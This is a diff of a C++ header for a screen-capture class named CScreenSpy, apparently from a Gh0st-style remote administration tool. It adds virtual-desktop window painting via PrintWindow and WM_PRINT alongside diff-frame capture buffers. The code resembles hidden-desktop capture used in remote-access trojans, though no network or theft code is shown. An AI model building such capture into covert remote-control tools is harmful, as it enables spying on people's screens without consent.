@@ -14,24 +14,76 @@
 #include "ScreenCapture.h"
 
 
+class EnumHwndsPrintData {
+public:
+	EnumHwndsPrintData() {
+		memset(this, 0, sizeof(EnumHwndsPrintData));
+	}
+	void Create(HDC desktop, int _x, int _y, int w, int h) {
+		x = _x;
+		y = _y;
+		width = w;
+		height = h;
+		hDcWindow = CreateCompatibleDC(desktop);
+		hBmpWindow = CreateCompatibleBitmap(desktop, w, h);
+	}
+	EnumHwndsPrintData& SetScreenDC(HDC dc) {
+		hDcScreen = dc;
+		return *this;
+	}
+	~EnumHwndsPrintData() {
+		if (hDcWindow) DeleteDC(hDcWindow);
+		hDcWindow = nullptr;
+		if (hBmpWindow)DeleteObject(hBmpWindow);
+		hBmpWindow = nullptr;
+	}
+	HDC GetWindowDC() const {
+		return hDcWindow;
+	}
+	HDC GetScreenDC() const {
+		return hDcScreen;
+	}
+	HBITMAP GetWindowBmp() const {
+		return hBmpWindow;
+	}
+	int X() const {
+		return x;
+	}
+	int Y() const {
+		return y;
+	}
+	int Width()const {
+		return width;
+	}
+	int Height()const {
+		return height;
+	}
+private:
+	HDC hDcWindow;
+	HDC hDcScreen;
+	HBITMAP hBmpWindow;
+	int x;
+	int y;
+	int width;
+	int height;
+};
+
 class CScreenSpy  : public ScreenCapture
 {
-private:
-	HWND             m_hDeskTopWnd;      //当前工作区的窗口句柄
-	HDC              m_hFullDC;          //Explorer.exe 的窗口设备DC
+protected:
+	HDC              m_hDeskTopDC;          // 屏幕上下文
+	HDC              m_hFullMemDC;          // 上一个上下文
+	HDC              m_hDiffMemDC;          // 差异上下文
+	HBITMAP	         m_BitmapHandle;        // 上一帧位图
+	HBITMAP	         m_DiffBitmapHandle;    // 差异帧位图
+	PVOID            m_BitmapData_Full;     // 当前位图数据
+	PVOID            m_DiffBitmapData_Full; // 差异位图数据
 
-	HDC              m_hFullMemDC;
-	HBITMAP	         m_BitmapHandle;
-	PVOID            m_BitmapData_Full;
-
-	HDC              m_hDiffMemDC;
-	HBITMAP	         m_DiffBitmapHandle;
-	PVOID            m_DiffBitmapData_Full;
-
-	ULONG            m_RectBufferOffset; // 缓存区位移
+	BOOL					m_bVirtualPaint;// 是否虚拟绘制
+	EnumHwndsPrintData		m_data;
 
 public:
-	CScreenSpy(ULONG ulbiBitCount, BYTE algo, int gop = DEFAULT_GOP);
+	CScreenSpy(ULONG ulbiBitCount, BYTE algo, BOOL vDesk = FALSE, int gop = DEFAULT_GOP);
 
 	virtual ~CScreenSpy();
 
@@ -65,21 +117,69 @@ public:
 		return m_BitmapInfor_Full->bmiHeader.biSizeImage;
 	}
 
-	FORCEINLINE VOID WriteRectBuffer(LPBYTE szBuffer, ULONG ulLength)
+	static BOOL PaintWindow(HWND hWnd, EnumHwndsPrintData* data)
 	{
-		memcpy(m_RectBuffer + m_RectBufferOffset, szBuffer, ulLength);
-		m_RectBufferOffset += ulLength;
+		if (!IsWindowVisible(hWnd) || IsIconic(hWnd))
+			return TRUE;
+
+		RECT rect;
+		if (!GetWindowRect(hWnd, &rect))
+			return FALSE;
+
+		HDC hDcWindow = data->GetWindowDC();
+		HBITMAP hOldBmp = (HBITMAP)SelectObject(hDcWindow, data->GetWindowBmp());
+		BOOL ret = FALSE;
+		if (PrintWindow(hWnd, hDcWindow, PW_RENDERFULLCONTENT) || SendMessageTimeout(hWnd, WM_PRINT,
+			(WPARAM)hDcWindow, PRF_CLIENT | PRF_NONCLIENT, SMTO_BLOCK, 50, NULL)) {
+			BitBlt(data->GetScreenDC(), rect.left - data->X(), rect.top - data->Y(),
+				rect.right - rect.left, rect.bottom - rect.top, hDcWindow, 0, 0, SRCCOPY);
+
+			ret = TRUE;
+		}
+		SelectObject(hDcWindow, hOldBmp);
+
+		return ret;
+	}
+
+	static int EnumWindowsTopToDown(HWND owner, WNDENUMPROC proc, LPARAM param)
+	{
+		HWND currentWindow = GetTopWindow(owner);
+		if (currentWindow == NULL)
+			return -1;
+		if ((currentWindow = GetWindow(currentWindow, GW_HWNDLAST)) == NULL)
+			return -2;
+		while (proc(currentWindow, param) && (currentWindow = GetWindow(currentWindow, GW_HWNDPREV)) != NULL);
+		return 0;
+	}
+
+	static BOOL CALLBACK EnumHwndsPrint(HWND hWnd, LPARAM lParam)
+	{
+		AUTO_TICK_C(50);
+		if (FALSE == PaintWindow(hWnd, (EnumHwndsPrintData*)lParam)) {
+			char text[_MAX_PATH] = {};
+			GetWindowText(hWnd, text, sizeof(text));
+			Mprintf("PaintWindow %s[%p] failed!!!\n", text, hWnd);
+		}
+
+		static OSVERSIONINFOA versionInfo = { sizeof(OSVERSIONINFOA) };
+		static BOOL result = GetVersionExA(&versionInfo);
+		if (versionInfo.dwMajorVersion < 6) {
+			DWORD style = GetWindowLongA(hWnd, GWL_EXSTYLE);
+			SetWindowLongA(hWnd, GWL_EXSTYLE, style | WS_EX_COMPOSITED);
+			EnumWindowsTopToDown(hWnd, EnumHwndsPrint, lParam);
+		}
+
+		return TRUE;
 	}
 
 	virtual LPBYTE GetFirstScreenData(ULONG* ulFirstScreenLength);
 
 	virtual LPBYTE ScanNextScreen() {
-		ScanScreen(m_hDiffMemDC, m_hFullDC, m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight);
+		ScanScreen(m_hDiffMemDC, m_hDeskTopDC, m_ulFullWidth, m_ulFullHeight);
 		return (LPBYTE)m_DiffBitmapData_Full;
 	}
 
 	VOID ScanScreen(HDC hdcDest, HDC hdcSour, ULONG ulWidth, ULONG ulHeight);
-
 };
 
 #endif // !defined(AFX_SCREENSPY_H__5F74528D_9ABD_404E_84D2_06C96A0615F4__INCLUDED_)
